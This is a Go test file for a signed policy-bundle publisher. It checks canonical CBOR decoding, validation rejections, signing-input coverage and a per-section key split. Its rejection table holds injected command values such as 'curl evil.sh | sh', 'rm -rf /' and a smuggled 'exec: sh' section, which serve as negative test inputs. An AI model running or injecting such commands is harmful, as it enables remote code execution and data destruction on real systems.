package policydist

import (
	"bytes"
	"crypto/ed25519"
	"errors"
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"

	"github.com/Omium-ai/omium-mark1/go/controld/internal/receipts"
)

// validSections is the smallest bundle content that satisfies every one of
// 07's productions. Tests mutate a copy of it, so every rejection test differs
// from an accepted baseline by exactly the thing under test — which is what
// stops a test from "passing" because the input was malformed for some second,
// unrelated reason.
func validSections() Sections {
	debounce := uint64(250)
	plcb := 0.91
	maxItems := uint64(8)
	return Sections{
		Verify: VerifySection{
			Anchors: []AnchorEnable{{
				CatalogID:  "pytest.exit_code",
				Enabled:    true,
				Thresholds: map[string]float64{"min_pass": 0.8, "timeout_s": 30},
				DebounceMS: &debounce,
			}},
			Verifiers: []VerifierModel{{
				VerifierID: "pytest@1.2.3",
				Confusion: [4][3]float64{
					{0.9, 0.05, 0.05},
					{0.05, 0.9, 0.05},
					{0.1, 0.1, 0.8},
					{0.2, 0.2, 0.6},
				},
			}},
			Priors:            [4]float64{0.7, 0.15, 0.1, 0.05},
			CorrelationGroups: []CorrelationGroup{{GroupID: "python.tests", Members: []string{"pytest@1.2.3"}}},
			Quarantine:        []string{"flaky.linter"},
		},
		Route: RouteSection{
			CPVS:    []CPVSRow{{TaskClass: "edit.small", ModelID: "claude-sonnet", PPass: 0.82, TokensEst: 1200}},
			Ladders: []Ladder{{LadderID: "default", Rungs: []Rung{{ModelID: "claude-haiku", KeepPrefix: true}, {ModelID: "claude-opus"}}}},
			Knee: KneeTable{
				CostBasis: "usd",
				Rows:      []KneeRow{{N: 1, CN: 0.01, PLCB: &plcb}, {N: 2, CN: 0.02}},
				VDefault:  1.5,
			},
		},
		Memory: MemorySection{
			InjectionRules: []InjectionRule{{Facet: "repo.conventions", MaxItems: &maxItems}},
			Budgets:        MemoryBudgets{PackTokensMax: 4000},
		},
		Cortex: CortexSection{
			MapBudgetTokens: BudgetRange{Min: 500, Max: 2000},
			Channels:        []string{"session_start", "prompt_submit"},
		},
		Gates: GatesSection{StopGateEnabled: true, MaxConsecutiveBlocks: 3, HourlyBlockCeiling: 20},
		AgentMaps: AgentMapsSection{Agents: []AgentMap{{
			AgentID:      "claudecode",
			AgentVersion: "1.0.88",
			HookFields:   map[string]string{"session_id": "/session_id", "cwd": "/cwd"},
			TailerRules:  map[string]string{"tool_use": "/message/content/0/name"},
		}}},
	}
}

func mustEncode(t *testing.T, v any) []byte {
	t.Helper()
	b, err := canonEnc.Marshal(v)
	if err != nil {
		t.Fatalf("encoding test input: %v", err)
	}
	return b
}

// sectionsMap renders the baseline as a map so a test can replace one section
// with hand-built CBOR the Go types could not otherwise express.
func sectionsMap(t *testing.T, override map[string]any) []byte {
	t.Helper()
	s := validSections()
	all := map[string]any{
		"verify": s.Verify, "route": s.Route, "memory": s.Memory,
		"cortex": s.Cortex, "gates": s.Gates, "agent_maps": s.AgentMaps,
	}
	for k, v := range override {
		if _, known := all[k]; !known {
			t.Fatalf("override names unknown section %q", k)
		}
		all[k] = v
	}
	return mustEncode(t, all)
}

func TestDecodeSectionsAcceptsCanonicalBaseline(t *testing.T) {
	raw := mustEncode(t, validSections())
	got, err := DecodeSections(raw)
	if err != nil {
		t.Fatalf("baseline must decode: %v", err)
	}
	if len(got.Verify.Anchors) != 1 || got.Gates.MaxConsecutiveBlocks != 3 {
		t.Fatalf("decoded sections lost content: %+v", got)
	}
	// Positive control AT the FR-VERIFY-010 bounds: mcb=3 above, and the
	// hourly ceiling exactly at the edge default must decode.
	s := validSections()
	s.Gates.HourlyBlockCeiling = maxHourlyBlockCeiling
	if _, err := DecodeSections(mustEncode(t, s)); err != nil {
		t.Fatalf("hourly_block_ceiling at the bound (%d) must decode: %v", maxHourlyBlockCeiling, err)
	}
	// D-EF positive control: ε>0 under a signed opt-in true, and present-false at ε 0.
	yes, no := true, false
	s = validSections()
	s.Route.Exploration, s.Route.ExplorationOptIn = &Exploration{Epsilon: 0.05}, &yes
	if got, err := DecodeSections(mustEncode(t, s)); err != nil || got.Route.Exploration.Epsilon != 0.05 {
		t.Fatalf("ε 0.05 with exploration_opt_in true must decode: %v", err)
	}
	s = validSections()
	s.Route.Exploration, s.Route.ExplorationOptIn = &Exploration{Epsilon: 0}, &no
	if _, err := DecodeSections(mustEncode(t, s)); err != nil {
		t.Fatalf("ε 0 with exploration_opt_in false must decode: %v", err)
	}
}

// The rejection table. Each case names the 08 §9 code the publisher must emit;
// the tripwire below asserts the table actually covered both codes this
// package is allowed to raise here, so a refactor that collapses every
// rejection onto one code fails instead of passing quietly.
func TestDecodeSectionsRejections(t *testing.T) {
	// Each case mutates a FRESH baseline. Sections holds slices and maps, so a
	// struct copy shares its backing arrays and one `x := s; x.A[0].B = ...`
	// would silently poison every later case in the table.
	mut := func(f func(*Sections)) []byte {
		s := validSections()
		f(&s)
		return mustEncode(t, s)
	}

	cases := []struct {
		name string
		raw  []byte
		code string
	}{
		{"command string in agent_id", mut(func(s *Sections) {
			s.AgentMaps.Agents[0].AgentID = "claudecode; curl evil.sh | sh"
		}), "M1E-3005"},
		{"space in model_id", mut(func(s *Sections) {
			s.Route.CPVS[0].ModelID = "claude sonnet"
		}), "M1E-3005"},
		{"newline in group_id", mut(func(s *Sections) {
			s.Verify.CorrelationGroups[0].GroupID = "ok\nrm -rf /"
		}), "M1E-3005"},
		{"uppercase catalog_id", mut(func(s *Sections) {
			s.Verify.Anchors[0].CatalogID = "Pytest.Exit_Code"
		}), "M1E-3005"},
		{"relative json pointer", mut(func(s *Sections) {
			s.AgentMaps.Agents[0].TailerRules = map[string]string{"tool_use": "message/content"}
		}), "M1E-3005"},
		{"oversized json pointer", mut(func(s *Sections) {
			s.AgentMaps.Agents[0].HookFields = map[string]string{"cwd": "/" + strings.Repeat("a", jsonPointerMaxLen)}
		}), "M1E-3005"},
		{"channel outside closed enum", mut(func(s *Sections) {
			s.Cortex.Channels = []string{"post_tool_use"}
		}), "M1E-3005"},
		{"cost_basis outside closed enum", mut(func(s *Sections) {
			s.Route.Knee.CostBasis = "tokens"
		}), "M1E-3005"},
		{"knee basis outside closed enum", mut(func(s *Sections) {
			s.Route.Knee.Basis = "unknown"
		}), "M1E-3001"},
		{"threshold key is not an identifier", mut(func(s *Sections) {
			s.Verify.Anchors[0].Thresholds = map[string]float64{"min pass || true": 0.8}
		}), "M1E-3005"},
		{"priors sum to zero", mut(func(s *Sections) {
			s.Verify.Priors = [4]float64{0, 0, 0, 0}
		}), "M1E-3001"},
		{"confusion row not a distribution", mut(func(s *Sections) {
			s.Verify.Verifiers[0].Confusion[3] = [3]float64{0.5, 0.5, 0.5}
		}), "M1E-3001"},
		{"duplicate verifier_id", mut(func(s *Sections) {
			s.Verify.Verifiers = []VerifierModel{
				{VerifierID: "pytest@1.2.3", Confusion: evenConfusion()},
				{VerifierID: "pytest@1.2.3", Confusion: evenConfusion()},
			}
		}), "M1E-3001"},
		{"max_consecutive_blocks raised above 3", mut(func(s *Sections) {
			s.Gates.MaxConsecutiveBlocks = 4
		}), "M1E-3001"},
		{"hourly_block_ceiling raised above the edge default", mut(func(s *Sections) {
			s.Gates.HourlyBlockCeiling = maxHourlyBlockCeiling + 1
		}), "M1E-3001"},
		{"cortex budget min > max", mut(func(s *Sections) {
			s.Cortex.MapBudgetTokens = BudgetRange{Min: 2000, Max: 500}
		}), "M1E-3001"},
		{"knee table with no rows", mut(func(s *Sections) {
			s.Route.Knee.Rows = nil
		}), "M1E-3001"},
		{"ladder with no rungs", mut(func(s *Sections) {
			s.Route.Ladders = []Ladder{{LadderID: "default"}}
		}), "M1E-3001"},
		{"correlation group with no members", mut(func(s *Sections) {
			s.Verify.CorrelationGroups = []CorrelationGroup{{GroupID: "python.tests"}}
		}), "M1E-3001"},
		{"exploration epsilon outside [0,1]", mut(func(s *Sections) {
			s.Route.Exploration = &Exploration{Epsilon: 1.5}
		}), "M1E-3001"},
		{"exploration epsilon > 0 without the signed opt-in (D-EF)", mut(func(s *Sections) {
			s.Route.Exploration = &Exploration{Epsilon: 0.05}
		}), "M1E-3001"},
		{"exploration epsilon > 0 with the signed opt-in false (D-EF)", mut(func(s *Sections) {
			no := false
			s.Route.Exploration, s.Route.ExplorationOptIn = &Exploration{Epsilon: 0.05}, &no
		}), "M1E-3001"},
		{"p_pass outside [0,1]", mut(func(s *Sections) {
			s.Route.CPVS[0].PPass = 1.2
		}), "M1E-3001"},
		{"ranker stage outside closed enum", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Stage = "canary" })
		}), "M1E-3001"},
		{"ranker weight above 1", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Weight = 1.5 })
		}), "M1E-3001"},
		{"ranker weight below 0", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Weight = -0.01 })
		}), "M1E-3001"},
		{"ranker weight NaN", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Weight = math.NaN() })
		}), "M1E-3001"},
		{"ranker bias infinite", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Bias = math.Inf(1) })
		}), "M1E-3001"},
		{"ranker with 3 coefficients", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Coefficients = []float64{0.6, 0.25, -0.1} })
		}), "M1E-3001"},
		{"ranker with 5 coefficients", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Coefficients = []float64{0.6, 0.25, -0.1, 0.15, 0} })
		}), "M1E-3001"},
		{"ranker coefficient NaN", mut(func(s *Sections) {
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Coefficients[2] = math.NaN() })
		}), "M1E-3001"},
		{"ranker with a stray key", sectionsMap(t, map[string]any{"cortex": map[string]any{
			"map_budget_tokens": map[string]any{"min": uint64(500), "max": uint64(2000)}, "channels": []string{"session_start"},
			"learned_ranker": map[string]any{"stage": "shadow", "weight": 0.5, "bias": 0.05, "coefficients": []float64{0.6, 0.25, -0.1, 0.15}, "model_id": "x"},
		}}), "M1E-3005"},
		// An absent required key zero-fills under the typed decoder and dies at the
		// canonical re-encode, the publisher's existing road for every missing key.
		{"ranker missing its bias", sectionsMap(t, map[string]any{"cortex": map[string]any{
			"map_budget_tokens": map[string]any{"min": uint64(500), "max": uint64(2000)}, "channels": []string{"session_start"},
			"learned_ranker": map[string]any{"stage": "shadow", "weight": 0.5, "coefficients": []float64{0.6, 0.25, -0.1, 0.15}},
		}}), "M1E-3005"},
		// 07 rule 3: an unknown key anywhere fails decode. Rule 4's wasm_module
		// is the specific shape that must never be tolerated, and it can only be
		// expressed by hand-building the map — the Go type has no such field.
		{"wasm_module smuggled into a section", sectionsMap(t, map[string]any{"gates": map[string]any{
			"stop_gate_enabled": true, "max_consecutive_blocks": uint64(3),
			"hourly_block_ceiling": uint64(20), "wasm_module": []byte("\x00asm"),
		}}), "M1E-3005"},
		{"seventh section", func() []byte {
			s := validSections()
			return mustEncode(t, map[string]any{
				"verify": s.Verify, "route": s.Route, "memory": s.Memory,
				"cortex": s.Cortex, "gates": s.Gates, "agent_maps": s.AgentMaps,
				"exec": map[string]any{"cmd": "sh"},
			})
		}(), "M1E-3005"},
	}

	seen := map[string]int{}
	ran := 0
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ran++
			_, err := DecodeSections(tc.raw)
			var rej *RejectError
			if err == nil {
				t.Fatalf("accepted; want %s", tc.code)
			}
			if !errors.As(err, &rej) {
				t.Fatalf("err is %T (%v); want *RejectError %s", err, err, tc.code)
			}
			if rej.Code != tc.code {
				t.Fatalf("code = %s (%s); want %s", rej.Code, rej.Detail, tc.code)
			}
		})
		seen[tc.code]++
	}
	// Tripwire. A suite that reports success while executing nothing is the
	// estate's recurring failure; these two lines make "the table emptied out"
	// or "one code stopped being reachable" a red test rather than a green one.
	if ran != len(cases) || ran < 15 {
		t.Fatalf("rejection table executed %d of %d cases", ran, len(cases))
	}
	if seen["M1E-3005"] == 0 || seen["M1E-3001"] == 0 {
		t.Fatalf("rejection table stopped covering both codes: %v", seen)
	}
}

// ranker is the cortex_learned_ranker vector's values with one field mutated.
func ranker(f func(*LearnedRanker)) *LearnedRanker {
	r := &LearnedRanker{Stage: "shadow", Weight: 0.5, Bias: 0.05, Coefficients: []float64{0.6, 0.25, -0.1, 0.15}}
	f(r)
	return r
}

// vectorSections lifts the six-section map's canonical bytes out of a frozen bundle vector.
func vectorSections(t *testing.T, name string) []byte {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(bundleVectorsDir, name+".cbor"))
	if err != nil {
		t.Skipf("frozen vectors unavailable: %v", err)
	}
	var top struct {
		Sections cbor.RawMessage `cbor:"sections"`
	}
	if err := cbor.Unmarshal(raw, &top); err != nil {
		t.Fatalf("decode %s: %v", name, err)
	}
	return top.Sections
}

// TestLearnedRankerIsOptionalClosedEnumAndBounded: the publisher's positive
// control is the frozen cortex_learned_ranker vector's own sections, decoded and
// re-encoded byte-for-byte (a decoder that dropped the key would fail the canonical
// check, not merely accept); the two frozen negatives reject with the edge's code.
func TestLearnedRankerIsOptionalClosedEnumAndBounded(t *testing.T) {
	got, err := DecodeSections(vectorSections(t, "cortex_learned_ranker"))
	if err != nil {
		t.Fatalf("cortex_learned_ranker sections must publish: %v", err)
	}
	want := LearnedRanker{Stage: "shadow", Weight: 0.5, Bias: 0.05, Coefficients: []float64{0.6, 0.25, -0.1, 0.15}}
	if r := got.Cortex.LearnedRanker; r == nil || r.Stage != want.Stage || r.Weight != want.Weight || r.Bias != want.Bias || !equalFloats(r.Coefficients, want.Coefficients) {
		t.Fatalf("learned_ranker: got %+v, want %+v", got.Cortex.LearnedRanker, want)
	}
	for _, tc := range []struct{ name, detail string }{
		{"cortex_ranker_bad_stage", "stage"},
		{"cortex_ranker_weight_out_of_range", "weight"},
	} {
		_, err := DecodeSections(vectorSections(t, tc.name))
		var rej *RejectError
		if err == nil || !errors.As(err, &rej) || rej.Code != "M1E-3001" || !strings.Contains(rej.Detail, tc.detail) {
			t.Fatalf("%s: %v, want M1E-3001 naming %s", tc.name, err, tc.detail)
		}
	}
	// Absent stays absent: the baseline carries no ranker and its bytes must not grow a null.
	s := validSections()
	if got, err := DecodeSections(mustEncode(t, s)); err != nil || got.Cortex.LearnedRanker != nil {
		t.Fatalf("no ranker: %v %+v", err, got.Cortex.LearnedRanker)
	}
	// Every stage of the closed enum and both weight bounds publish through the Go types.
	for _, stage := range []string{"probation", "shadow", "active"} {
		for _, w := range []float64{0, 1} {
			s := validSections()
			s.Cortex.LearnedRanker = ranker(func(r *LearnedRanker) { r.Stage, r.Weight = stage, w })
			if got, err := DecodeSections(mustEncode(t, s)); err != nil || got.Cortex.LearnedRanker == nil || got.Cortex.LearnedRanker.Weight != w {
				t.Fatalf("stage %s weight %v must publish: %v", stage, w, err)
			}
		}
	}
}

// TestDraftPublisherDecodesRankerFixture is the compiler lane's round-trip for a
// ranker-bearing draft: python/intel carried cortex_learned_ranker's cortex section
// through compile_sections (test_ranker_bearing_draft_carries_through_to_the_committed_fixture)
// and pinned the map; here it decodes, validates, re-encodes byte-for-byte and vets.
func TestDraftPublisherDecodesRankerFixture(t *testing.T) {
	raw, err := os.ReadFile(strings.TrimSuffix(compilerFixture, ".cbor") + "_ranker.cbor")
	if err != nil {
		t.Fatalf("compiler ranker fixture: %v", err)
	}
	s, err := DecodeSections(raw)
	if err != nil {
		t.Fatalf("compiler output does not pass the reference decoder: %v", err)
	}
	r := s.Cortex.LearnedRanker
	if r == nil || r.Stage != "shadow" || r.Weight != 0.5 || r.Bias != 0.05 || !equalFloats(r.Coefficients, []float64{0.6, 0.25, -0.1, 0.15}) ||
		s.Cortex.MapBudgetTokens != (BudgetRange{Min: 400, Max: 2000}) || len(s.Cortex.Channels) != 3 {
		t.Fatalf("cortex: %+v %+v", s.Cortex, r)
	}
	base, err := DecodeSections(readCompilerFixture(t))
	if err != nil {
		t.Fatal(err)
	}
	if base.Cortex.LearnedRanker != nil || !near(base.Route.Knee.Rows[0].CN, s.Route.Knee.Rows[0].CN) || len(base.Route.CPVS) != len(s.Route.CPVS) {
		t.Fatalf("the two compiler fixtures must differ only by the carried cortex section: %+v vs %+v", base.Cortex, s.Cortex)
	}
	dr, body, err := vet(draftOf(t, raw, "canary"))
	if err != nil || string(body) != string(raw) || string(dr.SectionsCBOR) != string(raw) {
		t.Fatalf("vet: %v %+v", err, dr)
	}
}

func equalFloats(a, b []float64) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func evenConfusion() [4][3]float64 {
	var c [4][3]float64
	for i := range c {
		c[i] = [3]float64{1.0 / 3, 1.0 / 3, 1.0 / 3}
	}
	return c
}

// A submission that decodes and validates but is not RFC 8949 §4.2.1 canonical
// must still be refused: signing bytes we re-encoded ourselves means the
// compiler's hash and ours disagree for reasons nobody can reproduce later.
func TestDecodeSectionsRefusesNonCanonicalEncoding(t *testing.T) {
	lengthFirst, err := cbor.EncOptions{Sort: cbor.SortLengthFirst}.EncMode()
	if err != nil {
		t.Fatal(err)
	}
	raw, err := lengthFirst.Marshal(validSections())
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(raw, mustEncode(t, validSections())) {
		t.Skip("length-first and bytewise orderings coincide for this shape; the test proves nothing")
	}
	_, err = DecodeSections(raw)
	var rej *RejectError
	if err == nil || !errors.As(err, &rej) || rej.Code != "M1E-3005" {
		t.Fatalf("non-canonical submission accepted or miscoded: %v", err)
	}
}

func TestPLCBAbsentIsAccepted(t *testing.T) {
	s := validSections()
	s.Route.Knee.Rows = []KneeRow{{N: 4, CN: 0.04}} // D-Z: absent ⇒ not evaluable ⇒ Stop = false
	if _, err := DecodeSections(mustEncode(t, s)); err != nil {
		t.Fatalf("an absent p_lcb must decode; the edge decides not to stop: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Signing input (decision D-Q)
// ---------------------------------------------------------------------------

func testBundle(t *testing.T) *Bundle {
	t.Helper()
	tid := uuid.MustParse("6f1c8b2e-6a5f-4e70-9f1a-2b6c9d3e4f50")
	return &Bundle{
		Schema: SchemaID, TenantID: tid[:], Channel: "stable", Seq: 42,
		IssuedAt: IssuedAtNow(), MaxAge: 3600, PrevHash: make([]byte, 32),
		Sections: validSections(),
	}
}

func TestSigningInputCoversEveryEnvelopeFieldExceptInclusion(t *testing.T) {
	b := testBundle(t)
	secs, err := sectionBytes(b.Sections)
	if err != nil {
		t.Fatal(err)
	}
	base, err := SigningInput(b, "verify", secs["verify"])
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.HasPrefix(base, []byte(BundleDomainPrefix)) {
		t.Fatal("signing input is not domain-separated")
	}

	// Each mutation must change the input. seq and prev_hash are the
	// anti-rollback fields; max_age is the fail-static floor; section_name is
	// what makes the key-class split enforceable rather than conventional.
	for _, tc := range []struct {
		name   string
		mutate func(*Bundle)
		other  string
	}{
		{name: "seq", mutate: func(b *Bundle) { b.Seq++ }},
		{name: "channel", mutate: func(b *Bundle) { b.Channel = "canary" }},
		{name: "max_age", mutate: func(b *Bundle) { b.MaxAge = 60 }},
		{name: "prev_hash", mutate: func(b *Bundle) { b.PrevHash = bytes.Repeat([]byte{1}, 32) }},
		{name: "issued_at", mutate: func(b *Bundle) { b.IssuedAt = b.IssuedAt.Add(-time.Second) }},
		{name: "tenant_id", mutate: func(b *Bundle) { b.TenantID = bytes.Repeat([]byte{9}, 16) }},
		{name: "section_name", other: "route"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			m := *b
			name := "verify"
			if tc.other != "" {
				name = tc.other
			}
			if tc.mutate != nil {
				tc.mutate(&m)
			}
			got, err := SigningInput(&m, name, secs[name])
			if err != nil {
				t.Fatal(err)
			}
			if bytes.Equal(got, base) {
				t.Fatalf("%s is not covered by the signing input", tc.name)
			}
		})
	}

	// inclusion is the one field that must NOT change the body a leaf commits
	// to: a leaf cannot commit to the proof of its own inclusion.
	body, err := CanonicalBody(b)
	if err != nil {
		t.Fatal(err)
	}
	b.Inclusion = &Inclusion{TreeSize: 9, LeafIndex: 8, RootHash: make([]byte, 32)}
	withIncl, err := CanonicalBody(b)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(body, withIncl) {
		t.Fatal("CanonicalBody changed when inclusion was attached; body_sha256 and prev_hash would be unverifiable")
	}
	served, err := Marshal(b)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(served, body) {
		t.Fatal("the served bytes must carry the inclusion proof the body excludes")
	}
}

// ---------------------------------------------------------------------------
// Keyring (05 §4.5, the key-class split)
// ---------------------------------------------------------------------------

type fixedKeyID string

func (f fixedKeyID) Sign([]byte) ([]byte, error) { return make([]byte, 64), nil }
func (f fixedKeyID) KeyID() string               { return string(f) }
func (f fixedKeyID) Public() ed25519.PublicKey   { return nil }

func TestKeyringRefusesPartialAndSharedRings(t *testing.T) {
	full := map[string]SectionSigner{}
	for i, n := range SectionNames {
		full[n] = fixedKeyID(string(rune('a' + i)))
	}
	if _, err := NewKeyring(full); err != nil {
		t.Fatalf("a complete ring with six distinct keys must be accepted: %v", err)
	}

	missing := map[string]SectionSigner{}
	for n, s := range full {
		if n != "route" {
			missing[n] = s
		}
	}
	if _, err := NewKeyring(missing); err == nil {
		t.Fatal("a ring missing a section was accepted; five of six signatures reads as tampering at every edge")
	}

	shared := map[string]SectionSigner{}
	for n := range full {
		shared[n] = fixedKeyID("one-key")
	}
	if _, err := NewKeyring(shared); err == nil {
		t.Fatal("one key for all six sections was accepted; the section split would be a naming convention")
	}

	stray := map[string]SectionSigner{"exec": fixedKeyID("z")}
	for n, s := range full {
		stray[n] = s
	}
	if _, err := NewKeyring(stray); err == nil {
		t.Fatal("a key for an unknown section was accepted")
	}
}

func TestDeriveKeyringIsDeterministicAndSplit(t *testing.T) {
	seed := bytes.Repeat([]byte{7}, 32)
	a, err := DeriveKeyring(seed)
	if err != nil {
		t.Fatal(err)
	}
	b, err := DeriveKeyring(seed)
	if err != nil {
		t.Fatal(err)
	}
	ids := a.PublicKeyIDs()
	if len(ids) != len(SectionNames) {
		t.Fatalf("ring has %d keys, want %d", len(ids), len(SectionNames))
	}
	distinct := map[string]bool{}
	for _, id := range ids {
		distinct[id] = true
	}
	if len(distinct) != len(SectionNames) {
		t.Fatalf("HKDF produced %d distinct key ids for %d sections", len(distinct), len(SectionNames))
	}
	for name, id := range b.PublicKeyIDs() {
		if ids[name] != id {
			t.Fatalf("section %s derived a different key on a second call", name)
		}
	}
	if _, err := DeriveKeyring(seed[:16]); err == nil {
		t.Fatal("a short root seed was accepted")
	}
	if a.PrimaryKeyID() != ids["verify"] {
		t.Fatal("PrimaryKeyID must be the verify key; policy_bundles.signing_key_id means one thing")
	}
}

// The whole point of the split: a signature made with the verify key must not
// verify as the route section's, and vice versa.
func TestSectionSignaturesAreNotInterchangeable(t *testing.T) {
	ring, err := DeriveKeyring(bytes.Repeat([]byte{3}, 32))
	if err != nil {
		t.Fatal(err)
	}
	b := testBundle(t)
	secs, err := sectionBytes(b.Sections)
	if err != nil {
		t.Fatal(err)
	}
	sigs, err := ring.SignSections(b, secs)
	if err != nil {
		t.Fatal(err)
	}
	if len(sigs) != len(SectionNames) {
		t.Fatalf("signed %d sections, want %d", len(sigs), len(SectionNames))
	}
	for _, name := range SectionNames {
		signer := ring.byName[name].(*receipts.Signer)
		input, err := SigningInput(b, name, secs[name])
		if err != nil {
			t.Fatal(err)
		}
		if !receipts.Verify(signer.Public(), sigs[name].Sig, input) {
			t.Fatalf("section %s does not verify under its own key", name)
		}
		// The verify key must not validate any other section's signature.
		other := ring.byName["verify"].(*receipts.Signer)
		if name != "verify" && receipts.Verify(other.Public(), sigs[name].Sig, input) {
			t.Fatalf("the verify key validated the %s section signature", name)
		}
	}
}
